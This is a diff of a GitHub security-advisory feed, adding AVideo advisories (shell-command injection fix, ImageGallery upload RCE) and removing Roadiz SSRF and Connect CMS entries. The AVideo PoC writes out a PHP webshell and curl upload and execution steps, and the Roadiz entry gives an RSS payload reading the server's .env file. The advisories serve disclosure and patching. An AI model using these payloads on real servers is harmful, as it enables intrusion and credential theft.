+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Sanitize both <code>users_id</code> and <code>liveTransmitionHistory_id</code> immediately after input, and use <code>escapeshellarg()</code> on the log file path before shell execution.</p>
+<p><strong>In <code>restreamer.json.php</code>, after line 220 (input decoding), add input sanitization:</strong></p>
+<pre><code class="language-php">$robj = json_decode($request);
+// Sanitize fields that will be used in file paths and shell commands
+if (isset($robj-&gt;users_id)) {
+    $robj-&gt;users_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $robj-&gt;users_id);
+}
+if (isset($robj-&gt;liveTransmitionHistory_id)) {
+    $robj-&gt;liveTransmitionHistory_id = intval($robj-&gt;liveTransmitionHistory_id);
+}
+</code></pre>
+<p><strong>At lines 720 and 723, use <code>escapeshellarg()</code> on the log file path:</strong></p>
+<pre><code class="language-php">// Line 720:
+execFFMPEGAsyncOrRemote($command . ' &gt; ' . escapeshellarg($logFile) . ' 2&gt;&amp;1 ', $keyword, '', $restreamStandAloneFFMPEG);
+
+// Line 723:
+exec($command . ' &gt; ' . escapeshellarg($logFile) . ' 2&gt;&amp;1 &amp;');
+</code></pre>
+<p>Both fixes should be applied — input sanitization as defense-in-depth, and <code>escapeshellarg()</code> as the direct mitigation at the point of shell execution.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-5m4q-5cvx-36mw">https://github.com/WWBN/AVideo/security/advisories/GHSA-5m4q-5cvx-36mw</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33648">https://nvd.nist.gov/vuln/detail/CVE-2026-33648</a></li>
+<li><a href="https://github.com/WWBN/AVideo/commit/99b865413172045fef6a98b5e9bfc7b24da11678">https://github.com/WWBN/AVideo/commit/99b865413172045fef6a98b5e9bfc7b24da11678</a></li>
+<li><a href="https://github.com/advisories/GHSA-5m4q-5cvx-36mw">https://github.com/advisories/GHSA-5m4q-5cvx-36mw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5m4q-5cvx-36mw</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-25T17:47:21.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo Vulnerable to Remote Code Execution via MIME/Extension Mismatch in ImageGallery File Upload]]></title>
+        <id>https://github.com/advisories/GHSA-wxjw-phj6-g75w</id>
+        <link href="https://github.com/advisories/GHSA-wxjw-phj6-g75w"/>
+        <updated>2026-03-25T17:45:41.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The <code>ImageGallery::saveFile()</code> method validates uploaded file content using <code>finfo</code> MIME type detection but derives the saved filename extension from the user-supplied original filename without an allowlist check. An attacker can upload a polyglot file (valid JPEG magic bytes followed by PHP code) with a <code>.php</code> extension. The MIME check passes, but the file is saved as an executable <code>.php</code> file in a web-accessible directory, achieving Remote Code Execution.</p>
+<h2 id="details">Details</h2>
+<p>The vulnerability exists in <code>plugin/ImageGallery/ImageGallery.php</code> in the <code>saveFile()</code> method:</p>
+<pre><code class="language-php">// plugin/ImageGallery/ImageGallery.php:80-108
+static function saveFile($file, $videos_id)
+{
+    $allowedMimeTypes = ['image/jpeg', 'image/webp', 'image/gif', 'image/png', 'video/mp4'];
+    $directory = self::getImageDir($videos_id);
+
+    // MIME check on file CONTENT — bypassable with polyglot
+    $finfo = new finfo(FILEINFO_MIME_TYPE);
+    $fileType = $finfo-&gt;file($file['tmp_name']);
+
+    if (in_array($fileType, $allowedMimeTypes)) {
+        // Extension from attacker-controlled filename — NO allowlist
+        $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
+        do {
+            $newFilename = uniqid() . '.' . $extension;
+            $newFilePath = $directory . $newFilename;
+        } while (file_exists($newFilePath));
+
+        move_uploaded_file($file['tmp_name'], $newFilePath);
+        // ...
+    }
+}
+</code></pre>
+<p><strong>Root cause:</strong> Line 93 extracts the extension from the user-supplied <code>$file['name']</code> and uses it directly in the saved filename. There is no check against an allowlist of safe extensions (e.g., <code>jpg</code>, <code>png</code>, <code>gif</code>, <code>webp</code>, <code>mp4</code>).</p>
+<p><strong>Why the MIME check is insufficient:</strong> PHP's <code>finfo</code> with <code>FILEINFO_MIME_TYPE</code> inspects file content magic bytes. A file starting with JPEG magic bytes (<code>\xff\xd8\xff\xe0</code>) is identified as <code>image/jpeg</code> regardless of trailing content. Appending PHP code after the JPEG header creates a polyglot that passes the MIME check but executes as PHP when requested via the web server.</p>
+<p><strong>Why no server-level protection exists:</strong> The root <code>.htaccess</code> at line 73 blocks dangerous extensions but uses the pattern <code>php[a-z0-9]+</code> — which matches <code>.php5</code>, <code>.phtml</code>, <code>.phar</code>, etc., but intentionally does <strong>not</strong> match plain <code>.php</code> (since the application itself requires PHP execution). There is no <code>.htaccess</code> in the <code>videos/</code> directory to disable PHP execution in the upload target.</p>
+<p><strong>Upload path:</strong> Files are saved to <code>videos/{videoFilename}/ImageGallery/{uniqid}.php</code> — directly accessible via the web server.</p>
+<p>The upload endpoint at <code>plugin/ImageGallery/upload.json.php</code> requires:</p>
+<ol>
+<li>The ImageGallery plugin to be enabled (line 6-8)</li>
+<li>An authenticated user (line 10-12)</li>
+<li>The user must have manage permission on the video (line 18-20) — video owner or admin</li>
+</ol>
+<p>The response at line 27 calls <code>listFiles()</code> which returns the full URL of each uploaded file, giving the attacker the exact path to their webshell.</p>
+<h2 id="poc">PoC</h2>
+<p><strong>Prerequisites:</strong> Authenticated AVideo user account that owns at least one Image or Gallery type video.</p>
+<p><strong>Step 1: Create a polyglot PHP/JPEG file</strong></p>
+<pre><code class="language-bash">printf '\xff\xd8\xff\xe0\x00\x10JFIF' &gt; shell.php
+echo '&lt;?php if(isset($_GET["c"])){system($_GET["c"]);} ?&gt;' &gt;&gt; shell.php
+</code></pre>
+<p><strong>Step 2: Verify it passes finfo detection</strong></p>
+<pre><code class="language-bash">file --mime-type shell.php
+# Expected output: shell.php: image/jpeg
+</code></pre>
+<p><strong>Step 3: Upload via ImageGallery endpoint</strong></p>
+<pre><code class="language-bash">curl -b 'PHPSESSID=&lt;session_cookie&gt;' \
+  -F "upl=@shell.php;filename=shell.php" \
+  'https://target/plugin/ImageGallery/upload.json.php?videos_id=&lt;VIDEO_ID&gt;'
+</code></pre>
+<p><strong>Expected response:</strong></p>
+<pre><code class="language-json">{
+  "videos_id": "123",
+  "saveFile": true,
+  "error": false,
+  "list": [
+    {
+      "base": "67890abcdef12.php",
+      "type": "image/jpeg",
+      "url": "https://target/videos/video_filename/ImageGallery/67890abcdef12.php"
+    }
+  ]
+}
+</code></pre>
+<p><strong>Step 4: Execute the webshell</strong></p>
+<pre><code class="language-bash">curl 'https://target/videos/video_filename/ImageGallery/67890abcdef12.php?c=id'
+# Expected output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>An authenticated user with edit permission on any Image/Gallery video can achieve <strong>Remote Code Execution</strong> as the web server user. This allows:</p>
+<ul>
+<li>Reading sensitive configuration files (database credentials in <code>videos/configuration.php</code>)</li>
+<li>Full database access via the database credentials</li>
+<li>Reading/modifying/deleting any file accessible to the web server process</li>
+<li>Lateral movement within the server's network</li>
+<li>Potential privilege escalation depending on server configuration</li>
+</ul>
+<p>Any AVideo instance with the ImageGallery plugin enabled and user registration open is vulnerable. Since regular (non-admin) users can exploit this against their own videos, the barrier to exploitation is low.</p>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Add an extension allowlist check in <code>saveFile()</code> immediately after extracting the extension. The extension should be validated against the same set of types as the MIME allowlist:</p>
+<pre><code class="language-php">// plugin/ImageGallery/ImageGallery.php — in saveFile(), after line 93
+static function saveFile($file, $videos_id)
+{
+    $allowedMimeTypes = ['image/jpeg', 'image/webp', 'image/gif', 'image/png', 'video/mp4'];
++   $allowedExtensions = ['jpg', 'jpeg', 'webp', 'gif', 'png', 'mp4'];
+
+    $directory = self::getImageDir($videos_id);
+
+    $finfo = new finfo(FILEINFO_MIME_TYPE);
+    $fileType = $finfo-&gt;file($file['tmp_name']);
+
+    if (in_array($fileType, $allowedMimeTypes)) {
+        $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
++       if (!in_array($extension, $allowedExtensions)) {
++           return false;
++       }
+        do {
+            $newFilename = uniqid() . '.' . $extension;
+</code></pre>
+<p>Additionally, as defense-in-depth, add a <code>.htaccess</code> file to the <code>videos/</code> directory to disable PHP execution:</p>
+<pre><code class="language-apache"># videos/.htaccess
+php_flag engine off
+&lt;FilesMatch "\.php$"&gt;
+    Require all denied
+&lt;/FilesMatch&gt;
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-wxjw-phj6-g75w">https://github.com/WWBN/AVideo/security/advisories/GHSA-wxjw-phj6-g75w</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33647">https://nvd.nist.gov/vuln/detail/CVE-2026-33647</a></li>
+<li><a href="https://github.com/WWBN/AVideo/commit/345a8d3ece0ad1e1b71a704c1579cbf885d8f3ae">https://github.com/WWBN/AVideo/commit/345a8d3ece0ad1e1b71a704c1579cbf885d8f3ae</a></li>
+<li><a href="https://github.com/advisories/GHSA-wxjw-phj6-g75w">https://github.com/advisories/GHSA-wxjw-phj6-g75w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wxjw-phj6-g75w</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-25T17:45:40.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[invoiceninja/invoiceninja] Invoice Ninja Denylist Bypass may Lead to Stored XSS via Invoice Line Items]]></title>
         <id>https://github.com/advisories/GHSA-98wm-cxpw-847p</id>
@@ -821,251 +1442,5 @@ $INCLUDE /etc/passwd
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-03-23T21:43:14.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[roadiz/documents] Roadiz has Server-Side Request Forgery (SSRF) in roadiz/documents]]></title>
-        <id>https://github.com/advisories/GHSA-rc55-58f4-687g</id>
-        <link href="https://github.com/advisories/GHSA-rc55-58f4-687g"/>
-        <updated>2026-03-23T21:43:19.000Z</updated>
-        <content type="html"><![CDATA[<p>This vulnerability allows an authenticated attacker to read any file on the server's local file system that the web server process has access to, including highly sensitive environment variables, database credentials, and internal configuration files.</p>
-<table>
-<thead>
-<tr>
-<th align="left">Field</th>
-<th align="left">Details</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><strong>Vulnerability Class</strong></td>
-<td align="left">Server-Side Request Forgery (SSRF) &amp; Local File Inclusion (LFI)</td>
-</tr>
-<tr>
-<td align="left"><strong>Affected Component</strong></td>
-<td align="left"><code>RZ\Roadiz\Documents\DownloadedFile::fromUrl()</code></td>
-</tr>
-<tr>
-<td align="left"><strong>Prerequisites</strong></td>
-<td align="left">Authenticated user with <code>ROLE_ACCESS_DOCUMENTS</code></td>
-</tr>
-</tbody></table>
-<h2 id="technical-description">Technical Description</h2>
-<p>The Roadiz backend features tools for importing external media, such as compiling cover art from Podcast RSS Feeds or OEmbed providers. This feature is handled by various <code>MediaFinders</code>, which ultimately pass the extracted media URLs to the <code>DownloadedFile::fromUrl(string $url)</code> parsing mechanism.</p>
-<p>Inside <code>fromUrl()</code>, the application uses PHP's native <code>fopen()</code> function to fetch the remote resource and copy it into the local temporary directory before injecting it into the Flysystem Documents storage.</p>
-<h2 id="the-flaw">The Flaw</h2>
-<p>The <code>$url</code> parameter is passed to <code>fopen</code> <em>without any schema validation or sanitization</em>. In PHP, when stream wrappers are enabled, functions like <code>fopen</code> do not restrict operations to HTTP streams. If a <code>file://</code> scheme is supplied, PHP seamlessly converts the operation into a local file system read. Because an attacker tightly controls the XML feed (e.g., from a Podcast integration), they can inject a <code>file://</code> URI, forcing the CMS to "download" internal system files directly into the publicly accessible Media Library.</p>
-<hr>
-<h2 id="proof-of-concept-poc">Proof of Concept (PoC)</h2>
-<p>To reliably reproduce this vulnerability without requiring a live external URL, the attacker simply mimics the behavior of the Podcast importer manipulating the internal system.</p>
-<h3 id="step-1-craft-the-malicious-payload">Step 1: Craft the Malicious Payload</h3>
-<p>The attacker creates a standard Podcast RSS XML feed (<code>podcast.xml</code>) and hosts it externally (or on an internal network reachable by the CMS). Inside this XML, the <code>href</code> attribute for the podcast thumbnail is weaponized to target a sensitive system file:</p>
-<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd"&gt;
-  &lt;channel&gt;
-    &lt;title&gt;Roadiz LFI Exploit&lt;/title&gt;
-    &lt;!-- Payload triggers the local filesystem fetch via PHP streams --&gt;
-    &lt;itunes:image href="file:///app/.env" /&gt; 
-  &lt;/channel&gt;
-&lt;/rss&gt;
-</code></pre>
-<h3 id="step-2-exploit-the-cms">Step 2: Exploit the CMS</h3>
-<ol>
-<li>Authenticate to the Roadiz Backoffice.</li>
-<li>Navigate to <strong>Documents (Media Manager)</strong>.</li>
-<li>Select <strong>Add a document</strong> -&gt; <strong>Import from URL</strong> (or trigger a Podcast sync).</li>
-<li>Supply the URL of the malicious <code>podcast.xml</code> file.</li>
-</ol>
-<h3 id="step-3-extract-the-data">Step 3: Extract the Data</h3>
-<ol>
-<li>The <code>AbstractPodcastFinder</code> processes the XML and feeds <code>file:///app/.env</code> directly into <code>DownloadedFile::fromUrl()</code>.</li>
-<li>The Roadiz application silently reads its own <code>.env</code> file, creating a new "Document" arrayed with the contents of the file.</li>
-<li>The file manifests in the Media Manager grid as a broken image icon.</li>
-<li>The attacker actively downloads the newly generated Document from the dashboard, successfully extracting the framework's internal API keys, database credentials, and <code>APP_SECRET</code>.</li>
-</ol>
-<hr>
-<h2 id="impact-analysis">Impact Analysis</h2>
-<p>Exploitation of this vulnerability results in a total loss of <strong>Confidentiality</strong> for the web application and underlying operating system. </p>
-<ul>
-<li><strong>Application Compromise:</strong> An attacker can retrieve <code>.env</code>, <code>security.yaml</code>, or database <code>.sqlite</code> files, leading to complete horizontal and vertical privilege escalation.</li>
-<li><strong>System Enumeration:</strong> The attacker can read <code>/etc/passwd</code>, enumerating system users in preparation for lateral movement.</li>
-<li><strong>Cloud Environment Compromise:</strong> If deployed within AWS, Azure, or GCP, the SSRF vector can be pivoted to read internal cloud metadata endpoints (e.g., <code>http://169.254.169.254/latest/meta-data/</code>), allowing the attacker to steal Root IAM roles globally compromising the victim's infrastructure.</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/roadiz/core-bundle-dev-app/security/advisories/GHSA-rc55-58f4-687g">https://github.com/roadiz/core-bundle-dev-app/security/advisories/GHSA-rc55-58f4-687g</a></li>
-<li><a href="https://github.com/roadiz/core-bundle-dev-app/commit/7904f690a51b88b1c72c02149ebdf85fa81f19f2">https://github.com/roadiz/core-bundle-dev-app/commit/7904f690a51b88b1c72c02149ebdf85fa81f19f2</a></li>
-<li><a href="https://github.com/advisories/GHSA-rc55-58f4-687g">https://github.com/advisories/GHSA-rc55-58f4-687g</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rc55-58f4-687g</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-23T21:43:14.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[opensource-workshop/connect-cms] Connect CMS: Improper Authorization in the My Page Profile Update Feature Allows Modification of Arbitrary User Information]]></title>
-        <id>https://github.com/advisories/GHSA-qr6x-wvxr-8hm9</id>
-        <link href="https://github.com/advisories/GHSA-qr6x-wvxr-8hm9"/>
-        <updated>2026-03-23T20:39:11.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="security-advisory--my-page-profile-update-improper-authorization">Security Advisory — My Page Profile Update (Improper Authorization)</h1>
-<h2 id="summary">Summary</h2>
-<p>An improper authorization issue in the My Page profile update feature may allow modification of arbitrary user information.</p>
-<h2 id="affected-versions">Affected Versions</h2>
-<ul>
-<li>1.x series: &lt;= 1.41.0</li>
-<li>2.x series: &lt;= 2.41.0</li>
-</ul>
-<h2 id="patched-versions">Patched Versions</h2>
-<ul>
-<li>1.41.1</li>
-<li>2.41.1</li>
-</ul>
-<h2 id="description">Description</h2>
-<p>In part of the My Page profile update feature, another user's profile information or password could be modified. If exploited, arbitrary user accounts may be taken over. Exploitation requires that the attacker be able to reach the affected functionality as an authenticated user. Users affected by this vulnerability should update to a fixed version.</p>
-<h2 id="solution">Solution</h2>
-<p>Update to the fixed version.
-For the 1.x series, update to 1.41.1 or later.
-For the 2.x series, update to 2.41.1 or later.</p>
-<h2 id="credits">Credits</h2>
-<p>OpenSource WorkShops thanks <strong>Sho Odagiri</strong> (小田切 祥) of <strong>GMO Cybersecurity by Ierae, Inc.</strong> for reporting this vulnerability.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/opensource-workshop/connect-cms/security/advisories/GHSA-qr6x-wvxr-8hm9">https://github.com/opensource-workshop/connect-cms/security/advisories/GHSA-qr6x-wvxr-8hm9</a></li>
-<li><a href="https://github.com/opensource-workshop/connect-cms/commit/7c9951738c62a1d51b91e9956d1eb756c5d52cce">https://github.com/opensource-workshop/connect-cms/commit/7c9951738c62a1d51b91e9956d1eb756c5d52cce</a></li>
-<li><a href="https://github.com/opensource-workshop/connect-cms/releases/tag/v1.41.1">https://github.com/opensource-workshop/connect-cms/releases/tag/v1.41.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-qr6x-wvxr-8hm9">https://github.com/advisories/GHSA-qr6x-wvxr-8hm9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qr6x-wvxr-8hm9</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-23T20:39:10.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[opensource-workshop/connect-cms] Connect CMS: Improper Authorization in the My Page Profile Update Feature Allows Modification of Arbitrary User Information]]></title>
-        <id>https://github.com/advisories/GHSA-qr6x-wvxr-8hm9</id>
-        <link href="https://github.com/advisories/GHSA-qr6x-wvxr-8hm9"/>
-        <updated>2026-03-23T20:39:11.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="security-advisory--my-page-profile-update-improper-authorization">Security Advisory — My Page Profile Update (Improper Authorization)</h1>
-<h2 id="summary">Summary</h2>
-<p>An improper authorization issue in the My Page profile update feature may allow modification of arbitrary user information.</p>
-<h2 id="affected-versions">Affected Versions</h2>
-<ul>
-<li>1.x series: &lt;= 1.41.0</li>
-<li>2.x series: &lt;= 2.41.0</li>
-</ul>
-<h2 id="patched-versions">Patched Versions</h2>
-<ul>
-<li>1.41.1</li>
-<li>2.41.1</li>
-</ul>
-<h2 id="description">Description</h2>
-<p>In part of the My Page profile update feature, another user's profile information or password could be modified. If exploited, arbitrary user accounts may be taken over. Exploitation requires that the attacker be able to reach the affected functionality as an authenticated user. Users affected by this vulnerability should update to a fixed version.</p>
-<h2 id="solution">Solution</h2>
-<p>Update to the fixed version.
-For the 1.x series, update to 1.41.1 or later.
-For the 2.x series, update to 2.41.1 or later.</p>
-<h2 id="credits">Credits</h2>
-<p>OpenSource WorkShops thanks <strong>Sho Odagiri</strong> (小田切 祥) of <strong>GMO Cybersecurity by Ierae, Inc.</strong> for reporting this vulnerability.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/opensource-workshop/connect-cms/security/advisories/GHSA-qr6x-wvxr-8hm9">https://github.com/opensource-workshop/connect-cms/security/advisories/GHSA-qr6x-wvxr-8hm9</a></li>
-<li><a href="https://github.com/opensource-workshop/connect-cms/commit/7c9951738c62a1d51b91e9956d1eb756c5d52cce">https://github.com/opensource-workshop/connect-cms/commit/7c9951738c62a1d51b91e9956d1eb756c5d52cce</a></li>
-<li><a href="https://github.com/opensource-workshop/connect-cms/releases/tag/v1.41.1">https://github.com/opensource-workshop/connect-cms/releases/tag/v1.41.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-qr6x-wvxr-8hm9">https://github.com/advisories/GHSA-qr6x-wvxr-8hm9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qr6x-wvxr-8hm9</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-23T20:39:10.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[opensource-workshop/connect-cms] Connect CMS: Information Disclosure Due to Improper Authorization through the Page Content Retrieval Feature]]></title>
-        <id>https://github.com/advisories/GHSA-62ch-j6x7-722j</id>
-        <link href="https://github.com/advisories/GHSA-62ch-j6x7-722j"/>
-        <updated>2026-03-23T20:38:17.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="security-advisory--page-content-retrieval-improper-authorization">Security Advisory — Page Content Retrieval (Improper Authorization)</h1>
-<h2 id="summary">Summary</h2>
-<p>An improper authorization issue in the page content retrieval feature may allow retrieval of non-public information.</p>
-<h2 id="affected-versions">Affected Versions</h2>
-<ul>
-<li>1.x series: &lt;= 1.41.0</li>
-<li>2.x series: &lt;= 2.41.0</li>
-</ul>
-<h2 id="patched-versions">Patched Versions</h2>
-<ul>
-<li>1.41.1</li>
-<li>2.41.1</li>
-</ul>
-<h2 id="description">Description</h2>
-<p>In part of the page content retrieval feature, insufficient authorization checks could allow processing associated with non-public pages to be executed. If exploited, the contents and attachments of non-public pages may be obtained by a third party. Users affected by this vulnerability should update to a fixed version.</p>
-<h2 id="solution">Solution</h2>
-<p>Update to the fixed version.
-For the 1.x series, update to 1.41.1 or later.
-For the 2.x series, update to 2.41.1 or later.</p>
-<h2 id="credits">Credits</h2>
-<p>OpenSource WorkShop thanks <strong>Sho Odagiri</strong> (小田切 祥) of <strong>GMO Cybersecurity by Ierae, Inc.</strong> for reporting this vulnerability.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/opensource-workshop/connect-cms/security/advisories/GHSA-62ch-j6x7-722j">https://github.com/opensource-workshop/connect-cms/security/advisories/GHSA-62ch-j6x7-722j</a></li>
-<li><a href="https://github.com/advisories/GHSA-62ch-j6x7-722j">https://github.com/advisories/GHSA-62ch-j6x7-722j</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-62ch-j6x7-722j</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-23T20:38:16.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[opensource-workshop/connect-cms] Connect CMS: Information Disclosure Due to Improper Authorization through the Page Content Retrieval Feature]]></title>
-        <id>https://github.com/advisories/GHSA-62ch-j6x7-722j</id>
-        <link href="https://github.com/advisories/GHSA-62ch-j6x7-722j"/>
-        <updated>2026-03-23T20:38:17.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="security-advisory--page-content-retrieval-improper-authorization">Security Advisory — Page Content Retrieval (Improper Authorization)</h1>
-<h2 id="summary">Summary</h2>
-<p>An improper authorization issue in the page content retrieval feature may allow retrieval of non-public information.</p>
-<h2 id="affected-versions">Affected Versions</h2>
-<ul>
-<li>1.x series: &lt;= 1.41.0</li>
-<li>2.x series: &lt;= 2.41.0</li>
-</ul>
-<h2 id="patched-versions">Patched Versions</h2>
-<ul>
-<li>1.41.1</li>
-<li>2.41.1</li>
-</ul>
-<h2 id="description">Description</h2>
-<p>In part of the page content retrieval feature, insufficient authorization checks could allow processing associated with non-public pages to be executed. If exploited, the contents and attachments of non-public pages may be obtained by a third party. Users affected by this vulnerability should update to a fixed version.</p>
-<h2 id="solution">Solution</h2>
-<p>Update to the fixed version.
-For the 1.x series, update to 1.41.1 or later.
-For the 2.x series, update to 2.41.1 or later.</p>
-<h2 id="credits">Credits</h2>
-<p>OpenSource WorkShop thanks <strong>Sho Odagiri</strong> (小田切 祥) of <strong>GMO Cybersecurity by Ierae, Inc.</strong> for reporting this vulnerability.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/opensource-workshop/connect-cms/security/advisories/GHSA-62ch-j6x7-722j">https://github.com/opensource-workshop/connect-cms/security/advisories/GHSA-62ch-j6x7-722j</a></li>
-<li><a href="https://github.com/advisories/GHSA-62ch-j6x7-722j">https://github.com/advisories/GHSA-62ch-j6x7-722j</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-62ch-j6x7-722j</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-23T20:38:16.000Z</published>
     </entry>
 </feed>
